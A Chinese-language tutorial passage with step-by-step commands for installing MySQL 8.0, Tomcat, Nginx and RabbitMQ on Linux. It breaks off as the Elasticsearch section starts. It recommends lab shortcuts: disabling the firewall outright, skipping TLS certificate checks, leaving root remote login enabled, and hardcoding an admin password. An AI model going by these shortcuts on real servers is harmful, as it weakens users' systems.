<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行如下命令，此命令是MySQL安装后自带的配置程序</span></span><br><span class="line">mysql_secure_installation</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以通过<span class="built_in">which</span>命令查看到这个自带程序所在的位置</span></span><br><span class="line">root@DESKTOP-Q89USRE:~# which mysql_secure_installation</span><br><span class="line">/usr/bin/mysql_secure_installation</span><br></pre></td></tr></table></figure>
<ul>
<li>输入密码：<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlSeventy.png"></li>
<li>是否开启密码验证插件，如果需要增强密码安全性，输入y并回车，不需要直接回车（课程中选择直接回车）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlEighty.png"></li>
<li>是否更改root密码，需要输入y回车，不需要直接回车（课程不更改）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlNinety.png"></li>
<li>是否移除匿名用户，移除输入y回车，不移除直接回车（课程选择移除）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwenty.png"></li>
<li>是否禁止root用户远程登录，禁止输入y回车，不禁止直接回车（课程选择不禁止）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwentyOne.png"></li>
<li>是否移除自带的测试数据库，移除输入y回车，不移除直接回车（课程选择不移除）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwentyTwo%20.png"></li>
<li>是否刷新权限，刷新输入y回车，不刷新直接回车（课程选择刷新）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwentyThree.png"></li>
</ul>
<ul>
<li>登陆MySQL</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入密码即可登陆成功</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwentyFour.png"><br>至此，在Ubuntu上安装MySQL5.7版本成功。</p>
<h3 id="MySQL8-0版本在Ubuntu（WSL环境）系统安装"><a href="#MySQL8-0版本在Ubuntu（WSL环境）系统安装" class="headerlink" title="MySQL8.0版本在Ubuntu（WSL环境）系统安装"></a>MySQL8.0版本在Ubuntu（WSL环境）系统安装</h3><blockquote>
<p>课程中配置的WSL环境是最新的Ubuntu22.04版本，这个版本的软件商店内置的MySQL是8.0版本<br>所以直接可以通过apt安装即可<br>注意，课程是以WSL获得的Ubuntu操作系统环境。<br>如果你通过VMware虚拟机的方式获得了Ubuntu操作系统环境，操作步骤不用担心，和课程中使用WSL环境是&#x3D;&#x3D;完全一致的&#x3D;&#x3D;</p>
</blockquote>
<p>安装操作需root权限，你可以：</p>
<ul>
<li>通过 sudo su -，切换到root用户</li>
<li>或在每一个命令前，加上sudo，用来临时提升权限</li>
</ul>
<h4 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h4><ul>
<li>如果已经安装过MySQL5.7版本，需要卸载仓库信息哦</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载MySQL5.7版本</span></span><br><span class="line">apt remove -y mysql-client=5.7* mysql-community-server=5.7*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载5.7的仓库信息</span></span><br><span class="line">dpkg -l | grep mysql | awk &#x27;&#123;print $2&#125;&#x27; | xargs dpkg -P</span><br></pre></td></tr></table></figure>

<ul>
<li>更新apt仓库信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>

<ul>
<li>安装Mysql</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install -y mysql-server</span><br></pre></td></tr></table></figure>

<ul>
<li>启动Mysql</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql start			# 启动</span><br><span class="line">/etc/init.d/mysql stop			# 停止</span><br><span class="line">/etc/init.d/mysql status		# 查看状态</span><br></pre></td></tr></table></figure>

<ul>
<li>登陆MySQL设置密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接执行：mysql</span></span><br><span class="line">mysql</span><br></pre></td></tr></table></figure>
<ul>
<li>设置密码</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>退出MySQL控制台</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>
<ul>
<li>对MySQL进行初始化</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行如下命令，此命令是MySQL安装后自带的配置程序</span></span><br><span class="line">mysql_secure_installation</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以通过<span class="built_in">which</span>命令查看到这个自带程序所在的位置</span></span><br><span class="line">root@DESKTOP-Q89USRE:~# which mysql_secure_installation</span><br><span class="line">/usr/bin/mysql_secure_installation</span><br></pre></td></tr></table></figure>

<ul>
<li>输入密码：<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlSeventy.png"></li>
<li>是否开启密码验证插件，如果需要增强密码安全性，输入y并回车，不需要直接回车（课程中选择直接回车）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlEighty.png"></li>
<li>是否更改root密码，需要输入y回车，不需要直接回车（课程不更改）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlNinety.png"></li>
<li>是否移除匿名用户，移除输入y回车，不移除直接回车（课程选择移除）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwenty.png"></li>
<li>是否禁止root用户远程登录，禁止输入y回车，不禁止直接回车（课程选择不禁止）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwentyOne.png"></li>
<li>是否移除自带的测试数据库，移除输入y回车，不移除直接回车（课程选择不移除）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwentyTwo%20.png"></li>
<li>是否刷新权限，刷新输入y回车，不刷新直接回车（课程选择刷新）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwentyThree.png"></li>
</ul>
<ul>
<li>登陆MySQL</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入密码即可登陆成功</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlThirtyTwo.png"><br>至此，在Ubuntu上安装MySQL8版本成功。</p>
<h2 id="Tomcat安装部署【简单】"><a href="#Tomcat安装部署【简单】" class="headerlink" title="Tomcat安装部署【简单】"></a>Tomcat安装部署【简单】</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。</p>
<p>简单来说，Tomcat是一个WEB应用程序的托管平台，可以让用户编写的WEB应用程序，被Tomcat所托管，并提供网站服务。</p>
<blockquote>
<p>即让用户开发的WEB应用程序，变成可以被访问的网页。</p>
</blockquote>
<h3 id="安装-4"><a href="#安装-4" class="headerlink" title="安装"></a>安装</h3><p>Tomcat的安装非常简单，主要分为2部分：</p>
<ul>
<li>安装JDK环境</li>
<li>解压并安装Tomcat<blockquote>
<p>本次安装使用Tomcat版本是：10.0.27版本，需要Java（JDK）版本最低为JDK8或更高版本</p>
</blockquote>
</li>
</ul>
<p>课程中使用的JDK版本是：JDK8u351版本</p>
<h3 id="安装JDK环境"><a href="#安装JDK环境" class="headerlink" title="安装JDK环境"></a>安装JDK环境</h3><ul>
<li><p>下载JDK软件<br><a href="https://www.oracle.com/java/technologies/downloads"></a><br>在页面下方找到：<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/TomcatOne.png"><br>下载jdk-8u351-linux-x64.tar.gz<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/TomcatTwo.png"><br>&#x3D;&#x3D;在弹出的页面中输入Oracle的账户密码即可下载（如无账户，请自行注册，注册是免费的）&#x3D;&#x3D;</p>
</li>
<li><p>登陆Linux系统，切换到root用户<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/TomcatThree.png"></p>
</li>
<li><p>通过FinalShell，上传下载好的JDK安装包<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/TomcatFour.png"></p>
</li>
<li><p>创建文件夹，用来部署JDK，将JDK和Tomcat都安装部署到：&#x2F;export&#x2F;server 内</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /export/server</span><br></pre></td></tr></table></figure>

<ul>
<li>解压缩JDK安装文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-8u351-linux-x64.tar.gz -C /export/server</span><br></pre></td></tr></table></figure>

<ul>
<li>配置JDK的软链接</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /export/server/jdk1.8.0_351 /export/server/jdk</span><br></pre></td></tr></table></figure>

<ul>
<li>配置JAVA_HOME环境变量，以及将$JAVA_HOME&#x2F;bin文件夹加入PATH环境变量中</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑/etc/profile文件</span></span><br><span class="line">export JAVA_HOME=/export/server/jdk</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br></pre></td></tr></table></figure>
<ul>
<li>生效环境变量</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<ul>
<li>配置java执行程序的软链接</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除系统自带的java程序</span></span><br><span class="line">rm -f /usr/bin/java</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">软链接我们自己安装的java程序</span></span><br><span class="line">ln -s /export/server/jdk/bin/java /usr/bin/java</span><br></pre></td></tr></table></figure>

<ul>
<li>执行验证：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>

<h3 id="解压并部署Tomcat"><a href="#解压并部署Tomcat" class="headerlink" title="解压并部署Tomcat"></a>解压并部署Tomcat</h3><blockquote>
<p>Tomcat建议使用非Root用户安装并启动</p>
</blockquote>
<p>可以创建一个用户：tomcat用以部署</p>
<ul>
<li>首先，放行tomcat需要使用的8080端口的外部访问权限</li>
</ul>
<blockquote>
<p>CentOS系统默认开启了防火墙，阻止外部网络流量访问系统内部</p>
</blockquote>
<p>所以，如果想要Tomcat可以正常使用，需要对Tomcat默认使用的8080端口进行放行</p>
<p>放行有2种操作方式：</p>
<p>关闭防火墙<br>配置防火墙规则，放行端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下操作2选一即可</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式1：关闭防火墙</span></span><br><span class="line">systemctl stop firewalld		# 关闭防火墙</span><br><span class="line">systemctl disable firewalld		# 停止防火墙开机自启</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式2：放行8080端口的外部访问</span></span><br><span class="line">firewall-cmd --add-port=8080/tcp --permanent		# --add-port=8080/tcp表示放行8080端口的tcp访问，--permanent表示永久生效</span><br><span class="line">firewall-cmd --reload								# 重新载入防火墙规则使其生效</span><br></pre></td></tr></table></figure>

<blockquote>
<p>方便起见，建议同学们选择方式1，直接关闭防火墙一劳永逸</p>
</blockquote>
<p>防火墙的配置非常复杂，后面会视情况独立出一集防火墙配置规则的章节。</p>
<ul>
<li>以root用户操作，创建tomcat用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用root用户操作</span></span><br><span class="line">useradd tomcat</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可选，为tomcat用户配置密码</span></span><br><span class="line">passwd tomcat</span><br></pre></td></tr></table></figure>

<ul>
<li>下载Tomcat安装包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用root用户操作</span></span><br><span class="line">wget https://dlcdn.apache.org/tomcat/tomcat-10/v10.0.27/bin/apache-tomcat-10.0.27.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果出现https相关错误，可以使用--no-check-certificate选项</span></span><br><span class="line">wget --no-check-certificate https://dlcdn.apache.org/tomcat/tomcat-10/v10.0.27/bin/apache-tomcat-10.0.27.tar.gz</span><br></pre></td></tr></table></figure>

<ul>
<li>解压Tomcat安装包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用root用户操作，否则无权限解压到/export/server内，除非修改此文件夹权限</span></span><br><span class="line">tar -zxvf apache-tomcat-10.0.27.tar.gz -C /export/server</span><br></pre></td></tr></table></figure>

<ul>
<li>创建Tomcat软链接</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用root用户操作</span></span><br><span class="line">ln -s /export/server/apache-tomcat-10.0.27 /export/server/tomcat</span><br></pre></td></tr></table></figure>

<ul>
<li>修改tomcat安装目录权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用root用户操作，同时对软链接和tomcat安装文件夹进行修改，使用通配符*进行匹配</span></span><br><span class="line">chown -R tomcat:tomcat /export/server/*tomcat*</span><br></pre></td></tr></table></figure>

<ul>
<li>切换到tomcat用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su - tomcat</span><br></pre></td></tr></table></figure>

<ul>
<li>启动tomcat</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/export/server/tomcat/bin/startup.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>tomcat启动在8080端口，可以检查是否正常启动成功</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anp | grep 8080</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/TomcatFive.png"></p>
<ul>
<li>打开浏览器，输入：<br><a href="http://centos:8080或http://192.168.88.130:8080">http://centos:8080或http://192.168.88.130:8080</a></li>
</ul>
<p>使用主机名（需配置好本地的主机名映射）或IP地址访问Tomcat的WEB页面<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/TomcatSix.png"><br>至此，Tomcat安装配置完成。</p>
<h2 id="Nginx安装部署【简单】"><a href="#Nginx安装部署【简单】" class="headerlink" title="Nginx安装部署【简单】"></a>Nginx安装部署【简单】</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP&#x2F;POP3&#x2F;SMTP服务。</p>
<p>同Tomcat一样，Nginx可以托管用户编写的WEB应用程序成为可访问的网页服务，同时也可以作为流量代理服务器，控制流量的中转。</p>
<p>Nginx在WEB开发领域，基本上也是必备组件之一了。</p>
<h3 id="安装-5"><a href="#安装-5" class="headerlink" title="安装"></a>安装</h3><p>Nginx同样需要配置额外的yum仓库，才可以使用yum安装</p>
<blockquote>
<p>安装Nginx的操作需要root身份</p>
</blockquote>
<ul>
<li>安装yum依赖程序</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root执行</span></span><br><span class="line">yum install -y yum-utils</span><br></pre></td></tr></table></figure>

<ul>
<li>手动添加，nginx的yum仓库</li>
</ul>
<p>yum程序使用的仓库配置文件，存放在：&#x2F;etc&#x2F;yum.repo.d内。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建文件使用vim编辑</span></span><br><span class="line">vim /etc/yum.repos.d/nginx.repo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">填入如下内容并保存退出</span></span><br><span class="line">[nginx-stable]</span><br><span class="line">name=nginx stable repo</span><br><span class="line">baseurl=http://nginx.org/packages/centos/$releasever/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://nginx.org/keys/nginx_signing.key</span><br><span class="line">module_hotfixes=true</span><br><span class="line"></span><br><span class="line">[nginx-mainline]</span><br><span class="line">name=nginx mainline repo</span><br><span class="line">baseurl=http://nginx.org/packages/mainline/centos/$releasever/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=https://nginx.org/keys/nginx_signing.key</span><br><span class="line">module_hotfixes=true</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过如上操作，我们手动添加了nginx的yum仓库</p>
</blockquote>
<ul>
<li>通过yum安装最新稳定版的nginx</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root执行</span></span><br><span class="line">yum install -y nginx</span><br></pre></td></tr></table></figure>


<ul>
<li>启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nginx自动注册了systemctl系统服务</span></span><br><span class="line">systemctl start nginx		# 启动</span><br><span class="line">systemctl stop nginx		# 停止</span><br><span class="line">systemctl status nginx		# 运行状态</span><br><span class="line">systemctl enable nginx		# 开机自启</span><br><span class="line">systemctl disable nginx		# 关闭开机自启</span><br></pre></td></tr></table></figure>

<ul>
<li>配置防火墙放行</li>
</ul>
<p>nginx默认绑定80端口，需要关闭防火墙或放行80端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式1（推荐），关闭防火墙</span></span><br><span class="line">systemctl stop firewalld		# 关闭</span><br><span class="line">systemctl disable firewalld		# 关闭开机自启</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式2，放行80端口</span></span><br><span class="line">firewall-cmd --add-port=80/tcp --permanent		# 放行tcp规则下的80端口，永久生效</span><br><span class="line">firewall-cmd --reload							# 重新加载防火墙规则</span><br></pre></td></tr></table></figure>

<ul>
<li>启动后浏览器输入Linux服务器的IP地址或主机名即可访问</li>
</ul>
<p><a href="http://192.168.88.130/">http://192.168.88.130</a> 或 <a href="http://centos/">http://centos</a></p>
<blockquote>
<p>ps：80端口是访问网站的默认端口，所以后面无需跟随端口号</p>
</blockquote>
<p>显示的指定端口也是可以的比如：</p>
<p><a href="http://192.168.88.130/">http://192.168.88.130:80</a><br><a href="http://centos/">http://centos:80</a></p>
<p>至此，Nginx安装配置完成。<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/NginxOne.png"></p>
<h2 id="RabbitMQ安装部署【简单】"><a href="#RabbitMQ安装部署【简单】" class="headerlink" title="RabbitMQ安装部署【简单】"></a>RabbitMQ安装部署【简单】</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>RabbitMQ一款知名的开源消息队列系统，为企业提供消息的发布、订阅、点对点传输等消息服务。</p>
<p>RabbitMQ在企业开发中十分常见，课程为大家演示快速搭建RabbitMQ环境。</p>
<h3 id="安装-6"><a href="#安装-6" class="headerlink" title="安装"></a>安装</h3><blockquote>
<p>rabbitmq在yum仓库中的版本比较老，所以我们需要手动构建yum仓库</p>
</blockquote>
<ul>
<li>准备yum仓库</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 准备gpgkey密钥</span></span><br><span class="line">rpm --import https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">rpm --import https://packagecloud.io/rabbitmq/erlang/gpgkey</span><br><span class="line">rpm --import https://packagecloud.io/rabbitmq/rabbitmq-server/gpgkey</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 准备仓库文件</span></span><br><span class="line">vim /etc/yum.repos.d/rabbitmq.repo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">填入如下内容</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Zero dependency Erlang</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"></span><br><span class="line">[rabbitmq_erlang]</span><br><span class="line">name=rabbitmq_erlang</span><br><span class="line">baseurl=https://packagecloud.io/rabbitmq/erlang/el/7/$basearch</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PackageCloud<span class="string">&#x27;s repository key and RabbitMQ package signing key</span></span></span><br><span class="line">gpgkey=https://packagecloud.io/rabbitmq/erlang/gpgkey</span><br><span class="line">       https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line"></span><br><span class="line">[rabbitmq_erlang-source]</span><br><span class="line">name=rabbitmq_erlang-source</span><br><span class="line">baseurl=https://packagecloud.io/rabbitmq/erlang/el/7/SRPMS</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">PackageCloud&#x27;</span>s repository key and RabbitMQ package signing key</span></span><br><span class="line">gpgkey=https://packagecloud.io/rabbitmq/erlang/gpgkey</span><br><span class="line">       https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># RabbitMQ server</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"></span><br><span class="line">[rabbitmq_server]</span><br><span class="line">name=rabbitmq_server</span><br><span class="line">baseurl=https://packagecloud.io/rabbitmq/rabbitmq-server/el/7/$basearch</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PackageCloud<span class="string">&#x27;s repository key and RabbitMQ package signing key</span></span></span><br><span class="line">gpgkey=https://packagecloud.io/rabbitmq/rabbitmq-server/gpgkey</span><br><span class="line">       https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line"></span><br><span class="line">[rabbitmq_server-source]</span><br><span class="line">name=rabbitmq_server-source</span><br><span class="line">baseurl=https://packagecloud.io/rabbitmq/rabbitmq-server/el/7/SRPMS</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://packagecloud.io/rabbitmq/rabbitmq-server/gpgkey</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br></pre></td></tr></table></figure>

<ul>
<li>安装RabbitMQ</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root执行</span></span><br><span class="line">yum install erlang rabbitmq-server -y</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Installed:</span><br><span class="line">  erlang.x86_64 0:23.3.4.11-1.el7           rabbitmq-server.noarch 0:3.10.0-1.el7</span><br></pre></td></tr></table></figure>

<ul>
<li>启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用systemctl管控，服务名：rabbitmq-server</span></span><br><span class="line">systemctl enable rabbitmq-server		# 开机自启</span><br><span class="line">systemctl disable rabbitmq-server		# 关闭开机自启</span><br><span class="line">systemctl start rabbitmq-server			# 启动</span><br><span class="line">systemctl stop rabbitmq-server			# 关闭</span><br><span class="line">systemctl status rabbitmq-server		# 查看状态</span><br></pre></td></tr></table></figure>

<ul>
<li>放行防火墙，RabbitMQ使用5672、15672、25672 3个端口</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式1（推荐），关闭防火墙</span></span><br><span class="line">systemctl stop firewalld		# 关闭</span><br><span class="line">systemctl disable firewalld		# 关闭开机自启</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式2，放行5672 25672端口</span></span><br><span class="line">firewall-cmd --add-port=5672/tcp --permanent		# 放行tcp规则下的5672端口，永久生效</span><br><span class="line">firewall-cmd --add-port=15672/tcp --permanent		# 放行tcp规则下的15672端口，永久生效</span><br><span class="line">firewall-cmd --add-port=25672/tcp --permanent		# 放行tcp规则下的25672端口，永久生效</span><br><span class="line">firewall-cmd --reload								# 重新加载防火墙规则</span><br></pre></td></tr></table></figure>

<ul>
<li>启动RabbitMQ的WEB管理控制台</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure>

<ul>
<li>添加admin用户，并赋予权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rabbitmqctl add_user admin &#x27;Itheima66^&#x27;</span><br><span class="line">rabbitmqctl set_permissions -p &quot;/&quot; &quot;admin&quot; &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;</span><br><span class="line">rabbitmqctl set_user_tags admin administrator</span><br></pre></td></tr></table></figure>

<ul>
<li>浏览器打开管理控制台<br><a href="http://192.168.88.130:15672/">http://192.168.88.130:15672</a><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/rabbitMqOne.png"></li>
</ul>
<h2 id="ElasticSearch安装部署"><a href="#ElasticSearch安装部署" class="headerlink" title="ElasticSearch安装部署"></a>ElasticSearch安装部署</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p>全文搜索属于最常见的需求，开源的 Elasticsearch （以下简称 es）是目前全文搜索引擎的首选。</p>
<p>它可以快速地储存、搜索和分析海量数据。维基百科、Stack Overflow、Github 都采用它。</p>
<p>Elasticsearch简称es，在企业内同样是一款应用非常广泛的搜索引擎服务。</p>
<p>很多服务中的搜索功能，都是基于es来实现的。</p>
<h3 id="安装-7"><a href="#安装-7" class="headerlink" title="安装"></a>安装</h3><ul>
<li>添加yum仓库</li>
</ul>
